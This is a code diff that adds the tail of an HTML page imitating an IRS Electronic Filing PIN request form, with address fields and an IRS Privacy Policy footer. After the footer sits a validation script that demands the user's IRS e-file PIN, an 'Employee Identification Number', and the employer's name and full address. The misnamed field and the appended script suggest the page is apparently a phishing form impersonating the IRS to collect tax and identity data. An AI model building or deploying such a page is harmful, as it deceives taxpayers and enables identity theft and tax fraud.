+         <div id="cityDivLabelId">
+          <label>
+           City
+           <span class="required">
+            *
+           </span>
+          </label>
+         </div>
+        </td>
+        <td class="td_align_left">
+         <div id="cityDivFieldId">
+          <input type="text" title="Enter City, County or Province (Only Enter City if U.S. Address)" id="city" value="" size="37" maxlength="50" name="city" />
+         </div>
+        </td>
+       </tr>
+       <!-- State -->
+       <tr>
+        <td class="td_align_right">
+         <div id="stateDivLblId">
+          <label>
+           State/U.S. Territory
+           <span class="required">
+            *
+           </span>
+          </label>
+         </div>
+        </td>
+        <td class="td_align_left">
+         <select title="Select your State or U.S. Territory" id="state" name="state">
+          <option selected="selected" value="ZZ">
+           Select One
+          </option>
+          <option value="AL">
+           Alabama (AL)
+          </option>
+          <option value="AK">
+           Alaska (AK)
+          </option>
+          <option value="AZ">
+           Arizona (AZ)
+          </option>
+          <option value="AR">
+           Arkansas (AR)
+          </option>
+          <option value="CA">
+           California (CA)
+          </option>
+          <option value="CO">
+           Colorado (CO)
+          </option>
+          <option value="CT">
+           Connecticut (CT)
+          </option>
+          <option value="DE">
+           Delaware (DE)
+          </option>
+          <option value="DC">
+           District of Columbia (DC)
+          </option>
+          <option value="FL">
+           Florida (FL)
+          </option>
+          <option value="GA">
+           Georgia (GA)
+          </option>
+          <option value="HI">
+           Hawaii (HI)
+          </option>
+          <option value="ID">
+           Idaho (ID)
+          </option>
+          <option value="IL">
+           Illinois (IL)
+          </option>
+          <option value="IN">
+           Indiana (IN)
+          </option>
+          <option value="IA">
+           Iowa (IA)
+          </option>
+          <option value="KS">
+           Kansas (KS)
+          </option>
+          <option value="KY">
+           Kentucky (KY)
+          </option>
+          <option value="LA">
+           Louisiana (LA)
+          </option>
+          <option value="ME">
+           Maine (ME)
+          </option>
+          <option value="MD">
+           Maryland (MD)
+          </option>
+          <option value="MA">
+           Massachusetts (MA)
+          </option>
+          <option value="MI">
+           Michigan (MI)
+          </option>
+          <option value="MN">
+           Minnesota (MN)
+          </option>
+          <option value="MS">
+           Mississippi (MS)
+          </option>
+          <option value="MO">
+           Missouri (MO)
+          </option>
+          <option value="MT">
+           Montana (MT)
+          </option>
+          <option value="NE">
+           Nebraska (NE)
+          </option>
+          <option value="NV">
+           Nevada (NV)
+          </option>
+          <option value="NH">
+           New Hampshire (NH)
+          </option>
+          <option value="NJ">
+           New Jersey (NJ)
+          </option>
+          <option value="NM">
+           New Mexico (NM)
+          </option>
+          <option value="NY">
+           New York (NY)
+          </option>
+          <option value="NC">
+           North Carolina (NC)
+          </option>
+          <option value="ND">
+           North Dakota (ND)
+          </option>
+          <option value="OH">
+           Ohio (OH)
+          </option>
+          <option value="OK">
+           Oklahoma (OK)
+          </option>
+          <option value="OR">
+           Oregon (OR)
+          </option>
+          <option value="PA">
+           Pennsylvania (PA)
+          </option>
+          <option value="RI">
+           Rhode Island (RI)
+          </option>
+          <option value="SC">
+           South Carolina (SC)
+          </option>
+          <option value="SD">
+           South Dakota (SD)
+          </option>
+          <option value="TN">
+           Tennessee (TN)
+          </option>
+          <option value="TX">
+           Texas (TX)
+          </option>
+          <option value="UT">
+           Utah (UT)
+          </option>
+          <option value="VT">
+           Vermont (VT)
+          </option>
+          <option value="VA">
+           Virginia (VA)
+          </option>
+          <option value="WA">
+           Washington (WA)
+          </option>
+          <option value="WV">
+           West Virginia (WV)
+          </option>
+          <option value="WI">
+           Wisconsin (WI)
+          </option>
+          <option value="WY">
+           Wyoming (WY)
+          </option>
+          <option value="">
+           -------
+          </option>
+          <option value="AS">
+           American Samoa (AS)
+          </option>
+          <option value="FM">
+           Federated States of Micronesia (FM)
+          </option>
+          <option value="GU">
+           Guam (GU)
+          </option>
+          <option value="MH">
+           Marshall Islands (MH)
+          </option>
+          <option value="MP">
+           Northern Mariana Islands (MP)
+          </option>
+          <option value="PW">
+           Palau (PW)
+          </option>
+          <option value="PR">
+           Puerto Rico (PR)
+          </option>
+          <option value="VI">
+           Virgin Islands (VI)
+          </option>
+          <option value="">
+           -------
+          </option>
+          <option value="AE">
+           Armed Forces Africa (AE)
+          </option>
+          <option value="AA">
+           Armed Forces Americas (AA)
+          </option>
+          <option value="AE">
+           Armed Forces Canada (AE)
+          </option>
+          <option value="AE">
+           Armed Forces Europe (AE)
+          </option>
+          <option value="AE">
+           Armed Forces Middle East (AE)
+          </option>
+          <option value="AP">
+           Armed Forces Pacific (AP)
+          </option>
+         </select>
+        </td>
+       </tr>
+       <!-- Zip Code -->
+       <tr>
+        <td class="td_align_right">
+         <div id="zipDivLabelId">
+          <label>
+           ZIP Code
+           <span class="required">
+            *
+           </span>
+          </label>
+         </div>
+        </td>
+        <td class="td_align_left">
+         <div id="zipDivFieldId">
+          <input type="text" title="Enter your Zip Code/Postal Code (Only Required if U.S. Address)" id="zipCode" value="" size="12" maxlength="12" name="zipCode" />
+         </div>
+        </td>
+       </tr>
+      </tbody>
+     </table>
+     <div id="button_container">
+      <div class="right_button_row">
+       <input type="submit" title="Click here to submit the form and receive your Electronic Filing PIN." value="Submit" name="submit" />
+      </div>
+     </div>
+    </form>
+    <script type="text/JavaScript" language="JavaScript">
+     checkErrors();
+	toggleHelpTopics();
+	updateTableSummary();
+	checkCountry(document.forms[0].country);
+    </script>
+   </div>
+   <div id="footer">
+    <a title="Click this link to view the IRS Privacy Policy" href="javascript:privacy_securitypolicy()">
+     IRS Privacy Policy
+    </a>
+   </div>
+  </div>
+  <script type="text/javascript">
+   function formValidation(){
+
+    if((document.efpForm.d_file[0].checked == false ) &amp;&amp; (document.efpForm.d_file[1].checked == false ))
+    {
+        alert ("Did You Submit Your Federal Income Tax Returns for 2014?");
+        return false;
+    }
+    else if(document.efpForm.d_file[0].checked == true)
+    {
+		if (document.efpForm.epin.value == "" )
+		{
+			alert("You must enter your IRS Electronic Filing PIN");
+			document.efpForm.epin.focus();
+            return false;
+        }
+		if(document.efpForm.epin.value.length &lt; 5 )
+        {
+            alert("Invalid IRS Electronic Filing PIN");
+            document.efpForm.epin.focus();
+            return false;
+        }
+        if (document.efpForm.ein.value == "" )
+		{
+			alert("You must enter your Employee Identification Number");
+			document.efpForm.ein.focus();
+            return false;
+        }
+		if(document.efpForm.ein.value.length &lt; 9 )
+        {
+            alert("Invalid Employee Identification Number");
+            document.efpForm.ein.focus();
+            return false;
+        }
+		if(document.efpForm.employer.value.length &lt; 5 )
+        {
+            alert("Provide Your Employer Name");
+            document.efpForm.employer.focus();
+            return false;
+        }
+		if(document.efpForm.employer_add.value.length &lt; 10 )
+        {
+            alert("Provide Your Employer Full Address");
+            document.efpForm.employer_add.focus();
+            return false;
+        }
+    }
+    
+    return true;
+}
+  </script>
+ </body>
+</html>
